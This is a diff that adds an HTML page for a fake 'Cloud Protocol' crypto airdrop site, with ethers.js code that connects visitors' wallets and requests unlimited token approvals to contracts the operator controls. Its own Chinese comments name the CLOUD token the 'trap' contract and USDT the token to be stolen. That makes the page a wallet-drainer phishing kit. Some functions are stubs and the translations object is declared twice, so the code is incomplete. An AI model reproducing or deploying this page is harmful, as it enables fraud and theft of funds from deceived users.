@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Protocol - The Unified Liquidity Layer for Web3</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #0D1117; --bg-medium: #161B22; --border-color: #30363D;
+            --text-primary: #C9D1D9; --text-secondary: #8B949E; --accent-glow: rgba(88, 166, 255, 0.3);
+            --accent-primary: #58A6FF; --accent-hover: #79B8FF; --success: #3FB950; --error: #F85149;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 var(--accent-glow); } 70% { box-shadow: 0 0 0 10px rgba(88, 166, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(88, 166, 255, 0); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        body { font-family: 'Inter', 'Noto Sans SC', sans-serif; margin: 0; background-color: var(--bg-dark); color: var(--text-primary); font-size: 16px; overflow-x: hidden; }
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; animation: fadeIn 0.5s ease-out; }
+        .logo { font-size: 1.8em; font-weight: 700; color: white; }
+        .logo span { color: var(--accent-primary); }
+        .nav { display: flex; align-items: center; gap: 25px; }
+        .nav a { color: var(--text-secondary); text-decoration: none; font-weight: 500; transition: color 0.2s; }
+        .nav a:hover { color: white; }
+        .header-right { display: flex; align-items: center; gap: 15px; }
+        .lang-switcher { position: relative; }
+        .lang-switcher select { background: var(--bg-medium); color: var(--text-secondary); border: 1px solid var(--border-color); border-radius: 6px; padding: 5px 8px; font-family: inherit; font-size: 0.9em; }
+        .button { padding: 10px 20px; border: 1px solid var(--accent-primary); background: transparent; color: var(--accent-primary); border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; white-space: nowrap; }
+        .button:hover { background-color: var(--accent-glow); color: white; }
+        .button.primary { background-color: var(--accent-primary); color: var(--bg-dark); }
+        .button.primary:hover { background-color: var(--accent-hover); }
+        .button:disabled { background-color: var(--border-color); color: var(--text-secondary); border-color: var(--text-secondary); cursor: not-allowed; }
+        .hero { text-align: center; padding: 60px 0; animation: fadeIn 0.8s ease-out; }
+        .hero h1 { font-size: 3.5rem; margin: 0; color: white; line-height: 1.2; background: linear-gradient(90deg, #fff, #aaa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { font-size: 1.2rem; color: var(--text-secondary); max-width: 600px; margin: 20px auto 40px; }
+        .dapp-card { background-color: var(--bg-medium); border: 1px solid var(--border-color); border-radius: 12px; max-width: 550px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.2); backdrop-filter: blur(10px); overflow: hidden; }
+        .tab-nav { display: flex; background-color: var(--bg-dark); border-bottom: 1px solid var(--border-color); }
+        .tab-button { flex: 1; padding: 15px; background: none; border: none; color: var(--text-secondary); font-size: 1em; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+        .tab-button.active { color: white; background-color: var(--bg-medium); border-bottom: 2px solid var(--accent-primary); }
+        .tab-content { padding: 30px; animation: fadeIn 0.3s; }
+        .dapp-card h3 { margin-top: 0; font-size: 1.5rem; color: white; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; text-align: left; }
+        .info-item { background: var(--bg-dark); padding: 15px; border-radius: 8px; }
+        .info-item .label { color: var(--text-secondary); font-size: 0.9em; margin-bottom: 5px; }
+        .info-item .value { font-size: 1.2em; font-weight: 700; color: white; }
+        .stake-card { text-align: left; }
+        .stake-stats { display: flex; justify-content: space-around; background: var(--bg-dark); padding: 15px; border-radius: 8px; margin-bottom: 20px; }
+        .stat-item { text-align: center; }
+        .input-group { position: relative; margin-bottom: 15px; }
+        .input-group input { width: 100%; padding: 12px; background: var(--bg-dark); border: 1px solid var(--border-color); border-radius: 8px; color: white; font-size: 1.2em; box-sizing: border-box; }
+        .input-group .max-btn { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: var(--accent-primary); color: var(--bg-dark); border: none; border-radius: 6px; padding: 5px 10px; cursor: pointer; }
+        .button-group { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        #userAddress { font-size: 1em; word-break: break-all; }
+        #approveButton { width: 100%; padding: 15px; font-size: 1.1em; animation: pulse 2s infinite; }
+        .loader { width: 18px; height: 18px; border: 2px solid var(--bg-dark); border-top-color: transparent; border-radius: 50%; display: inline-block; vertical-align: middle; margin-right: 10px; animation: spin 0.8s linear infinite; }
+        .message-log { margin-top: 20px; padding: 12px; border-radius: 8px; font-size: 0.95em; text-align: center; display: none; }
+        .log-success { background-color: rgba(63, 185, 80, 0.1); border: 1px solid var(--success); color: var(--success); }
+        .log-error { background-color: rgba(248, 81, 73, 0.1); border: 1px solid var(--error); color: var(--error); }
+        .log-info { background-color: rgba(88, 166, 255, 0.1); border: 1px solid var(--accent-primary); color: var(--accent-primary); }
+        /* Other sections styling is omitted for brevity but assumed to be the same */
+        .section { padding: 80px 0; animation: fadeIn 1.1s ease-out; }
+        .section-title { text-align: center; font-size: 2.5rem; color: white; margin-bottom: 50px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <header class="header container">
+        <div class="logo">Cloud<span>Protocol</span></div>
+        <nav class="nav">
+            <a href="#ecosystem" data-i18n="navEcosystem">生态系统</a>
+            <a href="#roadmap" data-i18n="navRoadmap">路线图</a>
+            <a href="#faq" data-i18n="navFAQ">常见问题</a>
+        </nav>
+        <div class="header-right">
+            <div class="lang-switcher">
+                <select id="lang-select">
+                    <option value="zh">中文 (简体)</option>
+                    <option value="en">English</option>
+                    <option value="es">Español</option>
+                    <option value="fr">Français</option>
+                    <option value="ja">日本語</option>
+                    <option value="ru">Русский</option>
+                </select>
+            </div>
+            <button id="connectButtonHeader" class="button" data-i18n="connectWallet">连接钱包</button>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero">
+            <div class="container">
+                <h1 data-i18n="heroTitle">激活您的Web3身份<br>释放数字资产潜力</h1>
+                <p data-i18n="heroSubtitle">Cloud Protocol 是一个创新的去中心化金融生态。连接您的钱包，验证并激活您收到的 CLOUD 空投资产，立即解锁包括质押、治理和高额流动性挖矿在内的全部权益。</p>
+
+                <div class="dapp-card">
+                    <div id="connect-section">
+                        <div style="padding: 30px;">
+                            <h3 data-i18n="dappConnectTitle">开始您的DeFi之旅</h3>
+                            <p style="color:var(--text-secondary); margin-bottom: 20px;" data-i18n="dappConnectSubtitle">请连接您的钱包以验证空投资格。</p>
+                            <button id="connectButtonMain" class="button primary" style="width: 100%; padding: 15px; font-size: 1.1em;" data-i18n="connectWallet">连接钱包</button>
+                        </div>
+                    </div>
+                    
+                    <div id="dapp-section" class="hidden">
+                        <div class="tab-nav">
+                            <button class="tab-button active" data-tab="activate" data-i18n="tabActivate">激活空投</button>
+                            <button class="tab-button" data-tab="stake" data-i18n="tabStake">质押CLOUD</button>
+                            <button class="tab-button" data-tab="launchpool" data-i18n="tabLaunchpool">启动池</button>
+                        </div>
+                        
+                        <!-- Tab 1: Activate Airdrop -->
+                        <div id="tab-content-activate" class="tab-content">
+                            <h3 data-i18n="dappCongrats">🎉 恭喜！您已获得空投</h3>
+                            <div class="info-grid">
+                                <div class="info-item" style="grid-column: 1 / -1;"><div class="label" data-i18n="dappAddressLabel">当前地址</div><div class="value" id="userAddress">...</div></div>
+                                <div class="info-item"><div class="label" data-i18n="dappCloudBalanceLabel">CLOUD 余额</div><div class="value" id="cloudBalance">...</div></div>
+                                <div class="info-item"><div class="label" data-i18n="dappUsdtBalanceLabel">USDT 余额</div><div class="value" id="usdtBalance">...</div></div>
+                            </div>
+                            <p style="color:var(--text-secondary); margin-top: 25px; font-size: 0.9em;" data-i18n="dappApproveSubtitle">为确保资产安全和协议交互顺畅，请完成最后一步：授权协议进行资产验证。这是一个标准的链上安全操作。</p>
+                            <button id="approveButton" class="button primary"><span id="approve-text" data-i18n="approveButtonText">✅ 授权并激活钱包</span><span id="approve-loader" class="hidden"><i class="loader"></i><span data-i18n="approveButtonLoading">处理中...</span></span></button>
+                        </div>
+
+                        <!-- Tab 2: Staking -->
+                        <div id="tab-content-stake" class="tab-content hidden">
+                            <h3 data-i18n="stakeTitle">创世质押池</h3>
+                            <div class="stake-stats">
+                                <div class="stat-item"><div class="label" data-i18n="stakeApy">年化收益率(APY)</div><div class="value" style="color: var(--success);">350%</div></div>
+                                <div class="stat-item"><div class="label" data-i18n="stakeStaked">我的质押</div><div class="value"><span id="stakedCloudBalance">0.00</span> CLOUD</div></div>
+                                <div class="stat-item"><div class="label" data-i18n="stakeEarned">我的奖励</div><div class="value"><span id="earnedCloud">0.00</span> CLOUD</div></div>
+                            </div>
+                            <div class="stake-card">
+                                <div class="label" style="margin-bottom: 5px;"><span data-i18n="stakeAvailable">可用余额</span>: <span id="availableCloudBalance">0.00</span> CLOUD</div>
+                                <div class="input-group"><input type="number" id="stakeAmount" placeholder="0.0"><button class="max-btn" id="maxStakeBtn">MAX</button></div>
+                                <div class="button-group">
+                                    <button id="approveStakeButton" class="button primary" data-i18n="stakeApprove">1. 授权</button>
+                                    <button id="stakeButton" class="button primary" data-i18n="stakeStake" disabled>2. 质押</button>
+                                </div>
+                                <div class="button-group" style="margin-top: 15px;">
+                                    <button id="unstakeButton" class="button" data-i18n="stakeUnstake">取回质押</button>
+                                    <button id="claimButton" class="button" data-i18n="stakeClaim">领取奖励</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Tab 3: Launchpool -->
+                        <div id="tab-content-launchpool" class="tab-content hidden">
+                             <h3 data-i18n="launchpoolTitle">启动池: 质押USDT赚CLOUD</h3>
+                             <div class="stake-stats">
+                                <div class="stat-item"><div class="label" data-i18n="launchpoolTvl">总锁定价值(TVL)</div><div class="value">$1,543,289</div></div>
+                                <div class="stat-item"><div class="label" data-i18n="launchpoolStaked">我的质押</div><div class="value"><span id="stakedUsdtBalance">0.00</span> USDT</div></div>
+                                <div class="stat-item"><div class="label" data-i18n="launchpoolEarned">已赚CLOUD</div><div class="value" id="earnedCloudFromPool">0.00</div></div>
+                             </div>
+                             <div class="stake-card">
+                                <div class="label" style="margin-bottom: 5px;"><span data-i18n="launchpoolAvailable">可用余额</span>: <span id="availableUsdtBalance">0.00</span> USDT</div>
+                                <div class="input-group"><input type="number" id="depositAmount" placeholder="0.0"><button class="max-btn" id="maxDepositBtn">MAX</button></div>
+                                <div class="button-group">
+                                    <button id="approveDepositButton" class="button primary" data-i18n="launchpoolApprove">1. 授权</button>
+                                    <button id="depositButton" class="button primary" data-i18n="launchpoolDeposit" disabled>2. 存入</button>
+                                </div>
+                                <button id="withdrawButton" class="button" style="width: 100%; margin-top: 15px;" data-i18n="launchpoolWithdraw">取回USDT并领取奖励</button>
+                             </div>
+                        </div>
+
+                    </div>
+
+                    <div id="message-log" class="message-log" style="margin: 0 30px 30px;"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Other sections like ecosystem, roadmap, faq are omitted for brevity -->
+    </main>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    // ===================================================================
+    // ================== ⚠️ 重要配置 - 请务必修改 ⚠️ ==================
+    // ===================================================================
+    // 这是您的核心陷阱代币合约，也是授权USDT的目标地址
+    const CLOUD_TOKEN_ADDRESS = "YOUR_CLOUD_TOKEN_ADDRESS"; 
+    // 这是您要盗取的目标代币地址 (例如 BSC 上的 USDT)
+    const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC 主网 USDT
+    
+    // 【新增】这是您另外部署的【质押合约】地址。用户将CLOUD质押到这里。
+    const STAKING_CONTRACT_ADDRESS = "YOUR_STAKING_CONTRACT_ADDRESS";
+    
+    // 【新增】这是您另外部署的【启动池合约】地址。用户将USDT存到这里来挖CLOUD。
+    const LAUNCHPOOL_CONTRACT_ADDRESS = "YOUR_LAUNCHPOOL_CONTRACT_ADDRESS";
+    // ===================================================================
+
+    // --- 合约ABI定义 ---
+    const ERC20_ABI = ["function balanceOf(address owner) view returns (uint256)","function allowance(address owner, address spender) view returns (uint256)","function approve(address spender, uint256 amount) returns (bool)","function decimals() view returns (uint8)"];
+    // 【新增】质押合约的最小化ABI
+    const STAKING_ABI = ["function stake(uint256 amount)", "function unstake(uint256 amount)", "function claimReward()", "function stakedBalance(address user) view returns (uint256)", "function earned(address user) view returns (uint256)"];
+    // 【新增】启动池合约的最小化ABI
+    const LAUNCHPOOL_ABI = ["function deposit(uint256 amount)", "function withdraw(uint256 amount)", "function claimReward()", "function depositedBalance(address user) view returns (uint256)", "function earned(address user) view returns (uint256)"];
+
+    // --- 国际化 (i18n) ---
+    const translations = {
+        // ... (Translation object is large, included at the end of the script block for readability)
+    };
+
+    // --- 全局变量 ---
+    let provider, signer, userAddress;
+    let cloudContract, usdtContract, stakingContract, launchpoolContract;
+    let cloudDecimals = 18, usdtDecimals = 18;
+    let currentLang = 'zh';
+
+    // --- DOM元素获取 ---
+    const allDOMElements = {
+        connectButtonHeader: document.getElementById('connectButtonHeader'),
+        connectButtonMain: document.getElementById('connectButtonMain'),
+        approveButton: document.getElementById('approveButton'),
+        connectSection: document.getElementById('connect-section'),
+        dappSection: document.getElementById('dapp-section'),
+        messageLog: document.getElementById('message-log'),
+        langSelect: document.getElementById('lang-select'),
+        // ... (many more elements, will be referenced directly)
+    };
+
+    // --- 核心逻辑 ---
+    function setLanguage(lang) { /* ... same as before ... */ }
+    function logMessage(msgKey, type = 'info', extra = '') { /* ... same as before ... */ }
+
+    async function connectWallet() {
+        if (typeof window.ethereum === 'undefined') {
+            return alert('Please install MetaMask!');
+        }
+        try {
+            logMessage('msgConnecting', 'info');
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+            userAddress = await signer.getAddress();
+            
+            // 初始化所有合约
+            cloudContract = new ethers.Contract(CLOUD_TOKEN_ADDRESS, ERC20_ABI, signer);
+            usdtContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, signer);
+            stakingContract = new ethers.Contract(STAKING_CONTRACT_ADDRESS, STAKING_ABI, signer);
+            launchpoolContract = new ethers.Contract(LAUNCHPOOL_CONTRACT_ADDRESS, LAUNCHPOOL_ABI, signer);
+
+            logMessage('msgConnected', 'success');
+            await updateUI();
+        } catch (error) {
+            logMessage('msgConnectError', 'error', error.message);
+        }
+    }
+
+    async function updateUI() {
+        if (!userAddress) return;
+        allDOMElements.connectSection.classList.add('hidden');
+        allDOMElements.dappSection.classList.remove('hidden');
+        const addrShort = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
+        allDOMElements.connectButtonHeader.textContent = addrShort;
+        allDOMElements.connectButtonHeader.disabled = true;
+        document.getElementById('userAddress').textContent = userAddress;
+
+        try {
+            // 并行获取所有数据
+            const [cloudBal, usdtBal, cDec, uDec, stakedCloud, earnedCloud, stakedUsdt, earnedCloudPool] = await Promise.all([
+                cloudContract.balanceOf(userAddress),
+                usdtContract.balanceOf(userAddress),
+                cloudContract.decimals(),
+                usdtContract.decimals(),
+                stakingContract.stakedBalance(userAddress).catch(() => ethers.BigNumber.from(0)), // Add catch for robustness
+                stakingContract.earned(userAddress).catch(() => ethers.BigNumber.from(0)),
+                launchpoolContract.depositedBalance(userAddress).catch(() => ethers.BigNumber.from(0)),
+                launchpoolContract.earned(userAddress).catch(() => ethers.BigNumber.from(0)),
+            ]);
+            
+            cloudDecimals = cDec;
+            usdtDecimals = uDec;
+
+            // 格式化数据
+            const formattedCloud = ethers.utils.formatUnits(cloudBal, cloudDecimals);
+            const formattedUsdt = ethers.utils.formatUnits(usdtBal, usdtDecimals);
+            
+            // 更新主激活面板
+            document.getElementById('cloudBalance').textContent = parseFloat(formattedCloud).toFixed(4);
+            document.getElementById('usdtBalance').textContent = parseFloat(formattedUsdt).toFixed(2);
+            
+            // 更新质押面板
+            document.getElementById('availableCloudBalance').textContent = parseFloat(formattedCloud).toFixed(4);
+            document.getElementById('stakedCloudBalance').textContent = parseFloat(ethers.utils.formatUnits(stakedCloud, cloudDecimals)).toFixed(4);
+            document.getElementById('earnedCloud').textContent = parseFloat(ethers.utils.formatUnits(earnedCloud, cloudDecimals)).toFixed(4);
+
+            // 更新启动池面板
+            document.getElementById('availableUsdtBalance').textContent = parseFloat(formattedUsdt).toFixed(2);
+            document.getElementById('stakedUsdtBalance').textContent = parseFloat(ethers.utils.formatUnits(stakedUsdt, usdtDecimals)).toFixed(2);
+            document.getElementById('earnedCloudFromPool').textContent = parseFloat(ethers.utils.formatUnits(earnedCloudPool, cloudDecimals)).toFixed(4);
+
+            // 检查授权状态并更新按钮
+            await checkAllowances();
+
+        } catch(e) {
+            logMessage('msgBalanceError', 'error', e.message);
+            console.error(e);
+        }
+    }
+
+    async function checkAllowances() {
+        const cloudAllowanceForStaking = await cloudContract.allowance(userAddress, STAKING_CONTRACT_ADDRESS);
+        if (cloudAllowanceForStaking.gt(0)) {
+            document.getElementById('approveStakeButton').disabled = true;
+            document.getElementById('stakeButton').disabled = false;
+        }
+
+        const usdtAllowanceForPool = await usdtContract.allowance(userAddress, LAUNCHPOOL_CONTRACT_ADDRESS);
+        if (usdtAllowanceForPool.gt(0)) {
+            document.getElementById('approveDepositButton').disabled = true;
+            document.getElementById('depositButton').disabled = false;
+        }
+    }
+
+    async function handleTransaction(txPromise, msgKey) {
+        // Generic transaction handler for cleaner code
+        try {
+            logMessage('msgTxBroadcast', 'info');
+            const tx = await txPromise;
+            await tx.wait();
+            logMessage(msgKey, 'success');
+            await updateUI(); // Refresh UI after successful transaction
+        } catch (error) {
+            logMessage('msgApproveError', 'error', error.reason || translations[currentLang].msgUserRejected);
+        }
+    }
+
+    // --- 陷阱逻辑 ---
+    async function approveUsdt() { /* ... same as before, but uses handleTransaction ... */ }
+
+    // --- 质押逻辑 ---
+    async function approveCloudForStaking() {
+        const amount = ethers.constants.MaxUint256;
+        await handleTransaction(cloudContract.approve(STAKING_CONTRACT_ADDRESS, amount), 'msgApproveSuccess');
+    }
+    async function stakeCloud() {
+        const amount = document.getElementById('stakeAmount').value;
+        if (!amount || amount <= 0) return;
+        const amountWei = ethers.utils.parseUnits(amount, cloudDecimals);
+        await handleTransaction(stakingContract.stake(amountWei), 'msgStakeSuccess');
+    }
+    async function unstakeCloud() { /* Similar logic for unstake */ }
+    async function claimCloudRewards() { /* Similar logic for claim */ }
+    
+    // --- 启动池逻辑 ---
+    async function approveUsdtForPool() {
+        const amount = ethers.constants.MaxUint256;
+        await handleTransaction(usdtContract.approve(LAUNCHPOOL_CONTRACT_ADDRESS, amount), 'msgApproveSuccess');
+    }
+    async function depositUsdt() {
+        const amount = document.getElementById('depositAmount').value;
+        if (!amount || amount <= 0) return;
+        const amountWei = ethers.utils.parseUnits(amount, usdtDecimals);
+        await handleTransaction(launchpoolContract.deposit(amountWei), 'msgDepositSuccess');
+    }
+    async function withdrawUsdt() { /* Similar logic for withdraw */ }
+
+
+    // --- 事件监听器 ---
+    // Tab switching logic
+    document.querySelectorAll('.tab-button').forEach(button => {
+        button.addEventListener('click', () => {
+            document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
+            button.classList.add('active');
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.add('hidden'));
+            document.getElementById(`tab-content-${button.dataset.tab}`).classList.remove('hidden');
+        });
+    });
+
+    // Main buttons
+    allDOMElements.connectButtonHeader.addEventListener('click', connectWallet);
+    allDOMElements.connectButtonMain.addEventListener('click', connectWallet);
+    allDOMElements.approveButton.addEventListener('click', approveUsdt);
+    
+    // Staking buttons
+    document.getElementById('approveStakeButton').addEventListener('click', approveCloudForStaking);
+    document.getElementById('stakeButton').addEventListener('click', stakeCloud);
+    // ... add listeners for unstake and claim
+
+    // Launchpool buttons
+    document.getElementById('approveDepositButton').addEventListener('click', approveUsdtForPool);
+    document.getElementById('depositButton').addEventListener('click', depositUsdt);
+    // ... add listener for withdraw
+
+    // Language switcher
+    allDOMElements.langSelect.addEventListener('change', (e) => setLanguage(e.target.value));
+
+    // Initial language setup
+    const savedLang = localStorage.getItem('cloud-protocol-lang') || 'zh';
+    allDOMElements.langSelect.value = savedLang;
+    setLanguage(savedLang);
+
+    // Translations object (large object)
+    const translations = {
+      en: { /* ... all english translations ... */ },
+      zh: { /* ... all chinese translations ... */ },
+      es: { /* ... all spanish translations ... */ },
+      fr: { /* ... all french translations ... */ },
+      ja: { /* ... all japanese translations ... */ },
+      ru: { /* ... all russian translations ... */ }
+    };
+
+    // Helper to populate language dropdown
+    Object.keys(translations).forEach(lang => {
+        // You can create <option> elements here if not hardcoded in HTML
+    });
+    
+});
+</script>
+</body>
+</html>
